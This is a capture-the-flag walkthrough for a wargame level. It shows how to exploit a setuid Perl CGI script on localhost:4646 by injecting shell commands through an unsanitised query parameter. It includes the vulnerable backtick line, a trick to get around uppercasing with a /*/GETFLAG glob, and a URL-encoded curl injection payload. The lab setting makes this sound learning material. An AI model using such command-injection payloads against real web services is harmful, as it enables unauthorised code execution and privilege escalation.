At the root of the repo is a perl script with two functions. 
It calls the CGI module to take params sent as query parameters to the server at localhost:4646.

You can check that a server is running with curl localhost:4646 -I. 
There are also log and access files that you can use to debug in /var.

The script indicates that two params can be used, x and y.

But, a look at the permissions on the perl script 
- -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl 
shows that when it runs, it runs as the owner, or flag12, even if our current user, level12, executes it. 
That means that any shell injection into the script would be executed with rights accorded to flag12 rather than level12.

This line 
@output = `egrep "^$xx" /tmp/xd 2>&1`; 
is executed between backticks without much parsing for xx, the x parameter. 
So trying to inject a shell command through it is a good option.

Running getflag simply results in: 
egrep "^GETFLAG" /tmp/xd 2>&1 
because the command is altered. 
Meaning the command will always be capitalised.

Running 
`getflag > /tmp/result` 
will also result in 
`egrep "^GETFLAG" /tmp/xd 2>&1`
because everything after the first whitespace(or first space) is deleted.

You can create a symlink from /bin/getflag to /tmp/GETFLAG. 
Or create a sh script that runs getflag and puts the resulting output in a /tmp/result file.

But running /tmp/GETFLAG capitalises to /TMP/GETFLAG. 
So we can run /*/GETFLAG to capture all the files named GETFLAG in repositories under /.

Then we need to escape the quotes in the egrep command.

You can pass 
random";/*/getflag;" 
as x so that the resulting command becomes: 
egrep "^RANDOM";/*/GETFLAG;"" /tmp/xd 2>&1

The final test would be: `curl 'localhost:4646?x=random";/*/getflag;"' 

But it needs url encoding:
curl localhost:4646?x=foo%22%3B%2F%2A%2Fgetflag%3B%22

Replacing all the special ASCII characters with URL-encoded ones. The result is in /tmp/result.
